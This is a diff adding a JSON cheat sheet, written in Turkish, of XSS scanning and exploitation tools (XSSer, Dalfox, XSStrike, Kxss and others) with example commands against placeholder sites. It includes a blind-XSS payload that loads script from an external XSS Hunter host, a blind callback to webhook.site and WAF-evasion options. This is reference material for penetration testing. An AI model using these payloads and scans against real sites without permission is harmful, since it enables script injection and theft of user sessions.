@@ -1,0 +1,64 @@
+{
+    "XSSer": {
+        "desc": "Otomatik XSS keşif ve sömürü aracı",
+        "usage": "xsser --url 'http://target.com/search.php?q=XSS'",
+        "examples": [
+            "xsser --url 'http://example.com/?q=XSS' --auto",
+            "xsser --url 'http://example.com/?q=XSS' --Fp '<script>alert(1)</script>'",
+            "xsser --url 'http://example.com/?q=XSS' --reverse-check"
+        ]
+    },
+    "Dalfox": {
+        "desc": "Hızlı ve güçlü XSS scanner (Golang)",
+        "usage": "dalfox url http://target.com/search?q=FUZZ",
+        "examples": [
+            "dalfox url 'http://example.com/?q=FUZZ'",
+            "dalfox file urls.txt",
+            "dalfox url 'http://example.com/?q=FUZZ' --blind https://webhook.site/xxx",
+            "dalfox url 'http://example.com/?q=FUZZ' --waf-evasion"
+        ]
+    },
+    "XSStrike": {
+        "desc": "Akıllı XSS detection suite",
+        "usage": "python3 xsstrike.py -u 'http://target.com/search?q=test'",
+        "examples": [
+            "python3 xsstrike.py -u 'http://example.com/?q=test'",
+            "python3 xsstrike.py -u 'http://example.com/?q=test' --fuzzer",
+            "python3 xsstrike.py -u 'http://example.com/?q=test' --crawl"
+        ]
+    },
+    "XSpear": {
+        "desc": "Ruby tabanlı XSS scanner",
+        "usage": "XSpear -u 'http://target.com/search?q=test'",
+        "examples": [
+            "XSpear -u 'http://example.com/?q=test'",
+            "XSpear -u 'http://example.com/?q=test' -t 10",
+            "XSpear -u 'http://example.com/?q=test' --cookie 'session=xxx'"
+        ]
+    },
+    "BruteXSS": {
+        "desc": "Brute force XSS detection",
+        "usage": "python brutexss.py -u 'http://target.com/search?q=FUZZ'",
+        "examples": [
+            "python brutexss.py -u 'http://example.com/?q=FUZZ'",
+            "python brutexss.py -u 'http://example.com/?q=FUZZ' -w payloads.txt"
+        ]
+    },
+    "XSS Hunter": {
+        "desc": "Blind XSS keşif platformu",
+        "usage": "\"><script src=https://yoursubdomain.xss.ht></script>",
+        "note": "XSS Hunter hesabı gerektirir - https://xsshunter.com"
+    },
+    "XSS Polyglo Scanner": {
+        "desc": "Çok dilli XSS payload scanner",
+        "usage": "Burp Suite extension olarak kullanılır"
+    },
+    "Kxss": {
+        "desc": "Reflected XSS keşfi için Golang aracı",
+        "usage": "cat urls.txt | kxss",
+        "examples": [
+            "echo 'http://example.com/?q=test' | kxss",
+            "waybackurls example.com | kxss"
+        ]
+    }
+}
